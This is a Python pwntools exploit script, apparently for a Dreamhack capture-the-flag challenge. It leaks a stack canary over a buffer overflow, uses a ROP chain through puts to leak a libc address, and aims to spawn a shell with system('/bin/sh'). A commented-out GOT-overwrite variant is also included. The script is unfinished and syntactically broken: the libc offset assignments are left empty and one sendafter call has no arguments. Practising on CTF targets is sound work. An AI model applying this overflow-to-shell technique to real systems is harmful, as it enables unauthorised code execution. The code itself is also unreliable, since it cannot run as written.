from pwn import *

#p = process("./rop")
p = remote("host3.dreamhack.games", 21749)
e = ELF("./rop_test")
#libc = ELF("/lib/x86_64-linux-gnu/libc-2.31.so")
#libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc = ELF("./libc-2.27.so")
context.arch = 'amd64'
context.log_level = 'debug'


def slog(n,m): return success(":".join([n,hex(m)]))

# [1] leak canary
buf = b"A"*0x39
p.sendafter("Buf: ", buf)
p.recvuntil(buf)
cnry = u64(b"\x00"+p.recvn(7))
slog("canary", cnry)


# [2] leak libc

#addresses

read_plt = 0x4005a0 
#read_plt = e.symbols["read"]
#read_got = 0x0000000000601010 #e.got["read"]
read_got = e.got["read"]
puts_plt = 0x400570 #e.plt["puts"] #why..?
puts_got = e.got["puts"]
# puts_plt = e.symbols["puts"]
pop_rdi = 0x4007f3 # pop rdi; ret;
pop_rsi_r15 = 0x4007f1 # pop rsi;  pop r15; ret;
main = 0x4006a7
ret = 0x40055e
slog("read_plt", read_plt)
slog("read_got", read_got)
slog("puts_plt", puts_plt)
slog("puts got", puts_got)
slog("pop rdi", pop_rdi)
slog("pop_rsi_r15", pop_rsi_r15)
slog("main", main)
slog("ret", ret)

# pop rdi;ret -> puts -> main

payload = b"A"*0x38 + p64(cnry) + b"B"*0x8
payload += p64(pop_rdi)
#payload += p64(read_got)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(main)

# get address of puts function
p.sendafter("Buf: ", payload)
puts = u64(p.recvn(6)+b"\x00"*2)
slog("puts function", puts)


# [3] calculate offset
puts_offset = 
system_offset =
binsh_offset =
libc = puts - puts_offset
system = libc + system_offset
binsh = libc + binsh_offset


# [4] call system("/bin/sh")
sendafter("Buf: ", )


'''
# read(0, read_got, 0x10)
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(0)
payload += p64(read_plt)

# read("/bin/sh") == system("/bin/sh")
payload += p64(pop_rdi)
payload += p64(read_got+0x8) 
payload += p64(read_plt)

# send payload! - overwrite GOT
p.sendafter("Buf: ", payload)
read = u64(p.recvn(6)+b"\x00"*2) # which value does recvn receive? read.got? or other?
lb = read - libc.symbols["read"] # read.got - read.real_address = offset
system = lb + libc.symbols["system"] # add offset to system.got
slog("read_address", read)
slog("libc_base", lb)
slog("system", system)
'''

p.send(p64(system)+b"/bin/sh\x00")

p.interactive()

